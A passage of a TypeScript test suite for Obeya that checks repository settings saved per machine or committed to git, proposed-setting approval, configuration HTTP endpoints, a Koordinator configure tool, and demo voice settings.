    const done = (await c.shareSettings({ path: web, direct: true }));
    expect(done).toEqual({ committed: git(origin, 'rev-parse', 'main').trim(), branch: 'main' });
    expect(JSON.parse(git(origin, 'show', 'main:.obeya/settings.json'))).toEqual(settings);
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }] }]);
    // read from origin's main, which has more than the local one
    expect((await c.checkSaved()).resolved[0]!.repos[0]!.values.checks).toEqual({ value: ['bun test'], source: 'repository' });
    expect(applied).toBe(1);
  });

  test('a setting the Arbeitsrückschau proposed, taken on this machine: it joins the values set there', async () => {
    mkdirSync(join(dir, 'home'));
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings: { checks: ['bun test'], setup: 'bun install' } }] }]));
    const c = config('file', []);
    expect((await c.takeSetting(web, 'run', 'bun dev --port 4000', 'machine'))).toBeNull();
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { checks: ['bun test'], setup: 'bun install', app: { run: 'bun dev --port 4000' } } }] }]);
    expect((await c.takeSetting(web, 'checks', ['bun run typecheck'], 'machine'))).toBeNull();
    expect(readConfigFile(file)[0]!.repos[0]!.settings!.checks).toEqual(['bun run typecheck']);
    // nothing went into the repository
    expect(existsSync(join(web, '.obeya/settings.json'))).toBe(false);
    expect(taken).toHaveLength(2);
  });

  test('a setting the Arbeitsrückschau proposed, taken for everyone where work lands on main: that value alone is committed, and applies here too', async () => {
    mkdirSync(join(dir, 'home'));
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings: { checks: ['bun test'], app: { run: 'npm start' } } }] }]));
    const c = config('file', []);
    const done = (await c.takeSetting(web, 'run', 'bun dev --port 4000', 'repository'));
    expect(done).toMatchObject({ branch: 'main', committed: git(web, 'rev-parse', 'main').trim() });
    expect(JSON.parse(git(web, 'show', 'main:.obeya/settings.json'))).toEqual({ app: { run: 'bun dev --port 4000' } });
    expect(git(web, 'log', '-1', '--format=%s', 'main').trim()).toBe('Obeya settings for everyone: app');
    // this machine's other value for it went, so the repository's applies here; its checks stay its own
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { checks: ['bun test'] } }] }]);
    expect((await c.checkSaved()).resolved[0]!.repos[0]!.values.app.run).toEqual({ value: 'bun dev --port 4000', source: 'repository' });
    expect(applied).toBe(1);
  });

  test('a setting the Arbeitsrückschau proposed, taken for everyone where work goes out as pull requests: one is opened, and the value applies here meanwhile', async () => {
    mkdirSync(join(dir, 'home'));
    const origin = join(dir, 'origin.git');
    gitClone(web, origin, { bare: true });
    git(web, 'remote', 'add', 'origin', origin);
    git(web, 'fetch', '--quiet', 'origin');
    const settings = { land: 'pr' as const };
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings }] }]));
    const opened: { title: string; head: string }[] = [];
    const c = new Config({
      file,
      source: 'file',
      started: [],
      store,
      running: () => [],
      server: { port: 4417, home: dir, permissionMode: 'auto' },
      forge: { ...noForge, open: async (_cwd, pr) => (opened.push(pr), 'https://github.com/acme/web/pull/8') },
      apply: () => {},
    });
    expect((await c.takeSetting(web, 'setup', 'bun install', 'repository'))).toEqual({ pr: 'https://github.com/acme/web/pull/8' });
    expect(opened).toMatchObject([{ title: 'Obeya settings for everyone: setup' }]);
    expect(JSON.parse(git(origin, 'show', `${opened[0]!.head}:.obeya/settings.json`))).toEqual({ setup: 'bun install' });
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { land: 'pr', setup: 'bun install' } }] }]);
  });

  test("a value the file held already stays this machine's when someone else changes the file", async () => {
    mkdirSync(join(dir, 'home'));
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings: { checks: ['a'], setup: 'x' } }] }]));
    const c = config('file', []);
    c.takenOver(web, { checks: ['a'] }, { checks: ['a'], setup: 'x' });
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { checks: ['a'] } }] }]);
  });

  test('shows the file when Obeya runs from it, the command line until something is saved', async () => {
    mkdirSync(join(dir, 'home'));
    writeFileSync(file, JSON.stringify([{ name: 'Aus Datei', repos: [{ path: web }] }]));
    expect(config('file', []).view().canvases).toEqual([{ name: 'Aus Datei', repos: [{ path: web }] }]);
    expect(config('args', [{ repos: [{ path: api }] }]).view().canvases).toEqual([{ repos: [{ path: api }] }]);
  });

  test('a check reads each repository once, all of them at once, and never makes the server wait for git', async () => {
    const c = config('file', []);
    const clone = join(dir, 'web-clone');
    gitClone(web, clone);
    // an origin on a server, as configured before git's insteadOf rewrites it, is read with the rest
    git(api, 'remote', 'add', 'origin', 'https://github.com/acme/api.git');
    git(api, 'config', `url.${web}.insteadOf`, 'https://github.com/acme/api.git');
    const calls: string[] = [];
    const { spawn, spawnSync } = Bun;
    const bun = Bun as unknown as Record<'spawn' | 'spawnSync', (cmd: string[], ...rest: unknown[]) => unknown>;
    bun.spawn = (cmd, ...rest) => (calls.push(cmd.join(' ')), (spawn as (...a: unknown[]) => unknown)(cmd, ...rest));
    bun.spawnSync = (cmd, ...rest) => (calls.push(`waits: ${cmd.join(' ')}`), (spawnSync as (...a: unknown[]) => unknown)(cmd, ...rest));
    let checked;
    try {
      // web is a repository of two canvases and a workspace of its own, beside a clone of it
      checked = await c.check([{ repos: [{ path: web, workspaces: [web, clone] }] }, { name: 'Zwei', repos: [{ path: web }, { path: api, settings: { branch: 'main' } }] }]);
    } finally {
      Object.assign(Bun, { spawn, spawnSync });
    }
    expect(checked.problems).toEqual([]);
    expect(calls.filter((x) => x.startsWith('waits: '))).toEqual([]);
    expect(calls.filter((x, i) => calls.indexOf(x) !== i)).toEqual([]);
  });

  test('expands ~ in paths', async () => {
    const home = process.env.HOME!;
    if (!web.startsWith(`${home}/`)) return;
    expect((await config('file', []).check([{ repos: [{ path: `~${web.slice(home.length)}` }] }])).problems).toEqual([]);
  });
});

describe('the configuration over HTTP', () => {
  let server: ReturnType<typeof serve>;
  let canvas: CanvasRuntime;
  beforeEach(async () => {
    const c = config('args', [{ repos: [{ path: web }] }], ['web']);
    canvas = await CanvasRuntime.start({ repos: [{ path: web }] }, { store, home: dir, runtime: new FakeRuntime(), forge: noForge, config: c });
    server = serve([canvas], { transcriber: { transcribe: async () => ({ text: '', doubtful: false }) } }, 0, false, c);
  });
  afterEach(() => {
    server.stop(true);
    canvas.shutdown();
  });
  const { fetch } = asOwner(() => server);
  const call = async (method: string, path: string, body?: unknown) => {
    const res = await fetch(new URL(path, server.url), { method, ...(body === undefined ? {} : { body: JSON.stringify(body), headers: { 'content-type': 'application/json' } }) });
    return { status: res.status, body: (await res.json()) as Record<string, unknown> };
  };

  test('reads, checks and saves it', async () => {
    const view = (await call('GET', '/api/config')).body as unknown as ConfigView;
    expect(view.canvases).toEqual([{ repos: [{ path: web }] }]);
    expect(view.running).toEqual(['web']);
    expect((await call('GET', '/api/config/check')).body).toMatchObject({ resolved: [{ id: 'web', repos: [{ id: 'web' }] }], problems: [] });

    const checked = await call('POST', '/api/config/check', [{ name: 'Zwei', repos: [{ path: web }, { path: join(dir, 'nowhere') }] }]);
    expect(checked.body.problems).toMatchObject([{ code: 'notRepo', canvas: 0, repo: 1 }]);

    const refused = await call('PUT', '/api/config', [{ repos: [{ path: join(dir, 'nowhere') }] }]);
    expect(refused).toMatchObject({ status: 400, body: { code: 'config' } });

    expect((await call('PUT', '/api/config', [{ repos: [{ path: web }, { path: api }] }])).body).toEqual({ restarting: true });
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }, { path: api }] }]);
  });

  test('makes the card that fills in the settings of a repository, once while it is open', async () => {
    const made = await call('POST', '/api/c/web/adapter-setup', { repo: 'web' });
    expect(made).toMatchObject({ status: 200, body: { title: 'Obeya für web einrichten', state: 'planned' } });
    expect(made.body.body).toContain('obeya:settings');
    expect((await call('POST', '/api/c/web/adapter-setup', { repo: 'web' })).body.id).toBe(made.body.id);
    expect((await call('POST', '/api/c/web/adapter-setup', { repo: 'nope' })).status).toBe(400);
  });

  test('reads and saves the language in its home, keeping the file\'s other settings', async () => {
    const before = (await call('GET', '/api/language')).body as unknown as LanguageView;
    expect(before).toMatchObject({ file: join(dir, 'settings.json'), chosen: null });
    expect(before.language).toBe(before.system);
    expect((await call('PUT', '/api/language', { language: 'fr' })).status).toBe(400);
    writeFileSync(join(dir, 'settings.json'), JSON.stringify({ later: 1 }));
    expect((await call('PUT', '/api/language', { language: 'en' })).body).toMatchObject({ chosen: 'en', language: 'en' });
    expect(JSON.parse(readFileSync(join(dir, 'settings.json'), 'utf8'))).toEqual({ later: 1, language: 'en' });
    // the server reads it whenever it needs it
    expect(ownerLanguage(dir)).toBe('en');
    expect((await call('PUT', '/api/language', { language: null })).body).toMatchObject({ chosen: null, language: before.system });
    expect(JSON.parse(readFileSync(join(dir, 'settings.json'), 'utf8'))).toEqual({ later: 1 });
  });

  test('reads and saves the demo settings in its home, without a restart', async () => {
    // without a narration language of their own, demos speak the owner's
    writeFileSync(join(dir, 'settings.json'), JSON.stringify({ language: 'de' }));
    const before = (await call('GET', '/api/demo-settings')).body as unknown as DemoSettingsView;
    expect(before).toMatchObject({ file: join(dir, 'demo.json'), settings: { language: 'de', voice: 'piper' }, check: { person: 'third', problems: [] } });
    expect(before.check.install).toMatchObject({ installed: false, missing: ['Piper', 'Piper-Stimme de_DE-thorsten-high'] });
    expect((await call('PUT', '/api/demo-settings', { language: 'fr', voice: 'piper' })).status).toBe(400);
    const saved = await call('PUT', '/api/demo-settings', { language: 'en', voice: 'command', command: ' speak ', ownVoice: true });
    expect(saved.body).toMatchObject({ settings: { language: 'en', voice: 'command', command: 'speak', ownVoice: true }, check: { person: 'first', problems: [] } });
    expect(JSON.parse(readFileSync(join(dir, 'demo.json'), 'utf8'))).toEqual({ language: 'en', voice: 'command', ownVoice: true, command: 'speak' });
    // a voice being chosen is checked before it is saved
    const draft = await call('POST', '/api/demo-settings/check', { language: 'en', voice: 'qwen3', references: { en: join(dir, 'me.wav') } });
    expect(draft.body).toMatchObject({ person: 'third', problems: [], clips: { en: 'referenceMissing' }, install: { installed: false } });
    // a draft the dialog kept from before names one clip: that of its language
    const old = await call('POST', '/api/demo-settings/check', { language: 'en', voice: 'qwen3', reference: join(dir, 'me.wav') });
    expect(old.body).toMatchObject({ clips: { en: 'referenceMissing' } });
    // the directory demos go into: the one that applies, and a relative one, which would land wherever the agent works
    expect(before.check).toMatchObject({ directory: join(homedir(), 'demos') });
    const demos = join(dir, 'demos');
    expect((await call('PUT', '/api/demo-settings', { language: 'en', voice: 'piper', directory: demos })).body).toMatchObject({ settings: { directory: demos }, check: { directory: demos } });
    const relative = (await call('POST', '/api/demo-settings/check', { language: 'en', voice: 'piper', directory: 'demos' })).body as unknown as DemoSettingsView['check'];
    expect(relative).toMatchObject({ directory: join(homedir(), 'demos'), directoryRelative: true });
    expect(restarts).toBe(0);
  });

  test.skipIf(!Bun.which('uv') || !Bun.which('ffmpeg'))('plays a sentence in the voice being chosen, or says why it cannot', async () => {
    const clip = join(dir, 'clip.wav');
    writeFileSync(clip, wav(0.2));
    const heard = await fetch(new URL('/api/demo-settings/sample', server.url), {
      method: 'POST',
      body: JSON.stringify({ language: 'de', voice: 'command', command: `cat > ${JSON.stringify(join(dir, 'said.txt'))}; cp ${JSON.stringify(clip)} "$DEMO_WAV"` }),
    });
    expect(heard.headers.get('content-type')).toBe('audio/wav');
    expect((await heard.arrayBuffer()).byteLength).toBeGreaterThan(44);
    expect(readFileSync(join(dir, 'said.txt'), 'utf8')).toContain('So klingt diese Stimme');
    const refused = await call('POST', '/api/demo-settings/sample', { language: 'de', voice: 'command', command: 'echo kaputt >&2; exit 3' });
    expect(refused).toMatchObject({ status: 400, body: { code: 'voiceSample' } });
    expect(String(refused.body.error)).toContain('kaputt');

    // an own endpoint gets the text and the language as JSON, the key as a bearer token
    let asked: { auth: string | null; body: unknown } | undefined;
    const endpoint = Bun.serve({
      port: 0,
      fetch: async (req) => {
        asked = { auth: req.headers.get('authorization'), body: await req.json() };
        return new Response(wav(0.3), { headers: { 'content-type': 'audio/wav' } });
      },
    });
    try {
      writeFileSync(join(dir, 'key'), 'geheim\n');
      const served = await fetch(new URL('/api/demo-settings/sample', server.url), {
        method: 'POST',
        body: JSON.stringify({ language: 'en', voice: 'http', url: `http://127.0.0.1:${endpoint.port}/tts`, keyFile: join(dir, 'key') }),
      });
      expect(served.status).toBe(200);
      expect(asked).toEqual({ auth: 'Bearer geheim', body: { text: expect.stringContaining('This is how the voice sounds'), language: 'en' } });
    } finally {
      endpoint.stop(true);
    }
  }, 60_000);

  test('a setting the Arbeitsrückschau proposed waits in the snapshot with its cards and the value now, and is taken where the owner says', async () => {
    mkdirSync(join(dir, 'home'));
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings: { checks: ['bun test'] } }] }]));
    const c = config('file', []);
    const live = await CanvasRuntime.start({ repos: [{ path: web }] }, { store, home: dir, runtime: new FakeRuntime(), forge: noForge, config: c, settings: (p) => c.repoSettings(p) });
    const at = serve([live], { transcriber: { transcribe: async () => ({ text: '', doubtful: false }) } }, 0, false, c);
    const post = async (path: string, body?: unknown) => {
      const res = await asOwner(() => at).fetch(new URL(path, at.url), { method: 'POST', ...(body === undefined ? {} : { body: JSON.stringify(body), headers: { 'content-type': 'application/json' } }) });
      return { status: res.status, body: res.status === 204 ? null : ((await res.json()) as Record<string, unknown>) };
    };
    try {
      const b = live.board;
      const [a1, a2] = [b.create({ title: 'Login-Seite', x: 0, y: 0 }), b.create({ title: 'Warenkorb', x: 0, y: 0 })];
      const run = b.proposeSetting({ repo: 'web', field: 'run', value: 'bun dev --port 4000; log in as demo@example.com', basis: 'Beide suchten den Start der App.', cards: [a1.id, a2.id] });
      const checks = b.proposeSetting({ repo: 'web', field: 'checks', value: ['bun test', 'bun run typecheck'], basis: 'Beide vergaßen den Typcheck.', cards: [a1.id, a2.id] });
      const setup = b.proposeSetting({ repo: 'web', field: 'setup', value: 'bun install', basis: '…', cards: [a1.id, a2.id] });
      expect(b.snapshot().settingProposals).toEqual([
        { id: run, repo: 'web', field: 'run', value: 'bun dev --port 4000; log in as demo@example.com', basis: 'Beide suchten den Start der App.', cards: [{ id: a1.id, title: 'Login-Seite' }, { id: a2.id, title: 'Warenkorb' }], now: '' },
        expect.objectContaining({ id: checks, now: ['bun test'] }),
        expect.objectContaining({ id: setup, now: '' }),
      ]);
      const notices: string[] = [];
      b.onNotice((n) => notices.push(n.text));

      expect((await post(`/api/c/web/setting-proposals/${run}/take`, { where: 'nowhere' })).status).toBe(400);
      // on this machine, in the owner's words
      expect((await post(`/api/c/web/setting-proposals/${run}/take`, { where: 'machine', value: ' bun dev --port 4100 ' })).status).toBe(200);
      expect(c.repoSettings(web)).toEqual({ checks: ['bun test'], app: { run: 'bun dev --port 4100' } });
      expect(notices.at(-1)).toBe('„So läuft die App“ für web gilt jetzt auf diesem Rechner.');
      // for everyone: committed on main, that value alone
      expect((await post(`/api/c/web/setting-proposals/${checks}/take`, { where: 'repository' })).body).toMatchObject({ branch: 'main' });
      expect(JSON.parse(git(web, 'show', 'main:.obeya/settings.json'))).toEqual({ checks: ['bun test', 'bun run typecheck'] });
      expect(c.repoSettings(web)).toEqual({ app: { run: 'bun dev --port 4100' } });
      expect(notices.at(-1)).toBe('„Prüfungen“ für web steht jetzt in .obeya/settings.json auf main und gilt für alle.');
      expect((await post(`/api/c/web/setting-proposals/${setup}/reject`)).status).toBe(204);
      expect(b.snapshot().settingProposals).toBeUndefined();
      expect(b.settingProposals().map((p) => [p.field, p.state, p.value])).toEqual([
        ['run', 'machine', 'bun dev --port 4100'],
        ['checks', 'repository', ['bun test', 'bun run typecheck']],
        ['setup', 'rejected', 'bun install'],
      ]);
      expect(await post(`/api/c/web/setting-proposals/${setup}/take`, { where: 'machine' })).toMatchObject({ status: 400, body: { code: 'unknownSetting' } });
    } finally {
      at.stop(true);
      live.shutdown();
    }
  });

  test('a configuration command of the Koordinator saves it after the undo window', async () => {
    await canvas.run({ do: 'configure', canvases: [{ name: 'Neu', repos: [{ path: web }] }] });
    expect(readConfigFile(file)).toEqual([{ name: 'Neu', repos: [{ path: web }] }]);
    expect(restarts).toBe(1);
  });
});

describe('a change the Koordinator makes', () => {
  test('keeps a canvas over a folder without git as it is while it adds a repository to another canvas', async () => {
    const docs = join(dir, 'Dokumente');
    mkdirSync(docs);
    const saved: CanvasConfig[] = [{ repos: [{ path: web }] }, { repos: [{ path: docs, git: false }] }];
    mkdirSync(join(dir, 'home'));
    writeFileSync(file, JSON.stringify(saved));
    const runtime = new FakeRuntime();
    const canvas = await CanvasRuntime.start({ repos: [{ path: web }] }, { store, home: dir, runtime, forge: noForge, config: config('file', saved, ['web', 'dokumente']), commandDelayMs: 0 });
    try {
      const heard = canvas.commander.hear('Nimm api auf die Leinwand web.', {});
      await until(() => runtime.sessions.some((s) => s.spec.tools.some((t) => t.name === 'configure')));
      const k = runtime.sessions.find((s) => s.spec.tools.some((t) => t.name === 'configure'))!;
      // the configuration as the Koordinator reads it, with api added, through the tool's schema as its SDK hands the arguments on
      const { canvases } = JSON.parse(await k.call('config', {})) as ConfigView;
      const tool = k.spec.tools.find((t) => t.name === 'configure')!;
      const args = z.object(tool.schema).parse({ canvases: [{ repos: [...canvases[0]!.repos, { path: api }] }, canvases[1]], confirm: 'api kommt auf die Leinwand web.' });
      expect(await tool.run(args)).not.toContain('Nothing recorded');
      k.emit({ type: 'idle' });
      canvas.commander.arm((await heard).token!);
      await until(() => readConfigFile(file).length === 2 && readConfigFile(file)[0]!.repos.length === 2);
      expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }, { path: api }] }, { repos: [{ path: docs, git: false }] }]);
    } finally {
      canvas.shutdown();
    }
  });
});

describe('the demo settings', () => {
  test('say what keeps a voice from speaking', () => {
    const missing = join(dir, 'nowhere');
    expect(demoSettingsProblems({ language: 'de', voice: 'piper' }, {})).toEqual([]);
    expect(demoSettingsProblems({ language: 'de', voice: 'command' }, {})).toEqual(['noCommand']);
    expect(demoSettingsProblems({ language: 'de', voice: 'http' }, {})).toEqual(['noUrl']);
    expect(demoSettingsProblems({ language: 'de', voice: 'http', url: 'http://localhost:9' }, {})).toEqual([]);
    expect(demoSettingsProblems({ language: 'de', voice: 'say' }, {}, 'linux')).toEqual(['notHere']);
    expect(demoSettingsProblems({ language: 'de', voice: 'say' }, {}, 'darwin')).toEqual([]);
    expect(demoSettingsProblems({ language: 'de', voice: 'gemini' }, {})).toEqual(['noKey']);
    expect(demoSettingsProblems({ language: 'de', voice: 'gemini' }, { GEMINI_API_KEY: 'k' })).toEqual([]);
    expect(demoSettingsProblems({ language: 'de', voice: 'azure', url: 'westeurope' }, {})).toEqual(['noKey']);
    expect(demoSettingsProblems({ language: 'de', voice: 'openai', keyFile: missing }, {})).toEqual(['keyFileMissing']);
    writeFileSync(join(dir, 'key'), 'k');
    expect(demoSettingsProblems({ language: 'en', voice: 'elevenlabs', keyFile: join(dir, 'key') }, {})).toEqual([]);
  });

  test("say which of Qwen3's clips to clone does not work, by its language", () => {
    writeFileSync(join(dir, 'me.wav'), '');
    const s = { language: 'de', voice: 'qwen3', references: { de: join(dir, 'me.wav'), en: join(dir, 'me-en.wav') } } as const;
    expect(clipProblems(s)).toEqual({ de: 'noTranscript', en: 'referenceMissing' });
    writeFileSync(join(dir, 'me.txt'), 'Hallo.');
    expect(clipProblems(s)).toEqual({ en: 'referenceMissing' });
    // another voice clones nothing
    expect(clipProblems({ ...s, voice: 'piper' })).toEqual({});
  });
});

/** A silent mono 16-bit WAV of `seconds`. */
function wav(seconds: number, rate = 16000) {
  const data = Math.round(seconds * rate) * 2;
  const b = Buffer.alloc(44 + data);
  b.write('RIFF', 0);
  b.writeUInt32LE(36 + data, 4);
  b.write('WAVEfmt ', 8);
  b.writeUInt32LE(16, 16);
  b.writeUInt16LE(1, 20);
  b.writeUInt16LE(1, 22);
  b.writeUInt32LE(rate, 24);
  b.writeUInt32LE(rate * 2, 28);
  b.writeUInt16LE(2, 32);
  b.writeUInt16LE(16, 34);
  b.write('data', 36);
  b.writeUInt32LE(data, 40);
  return b;
}
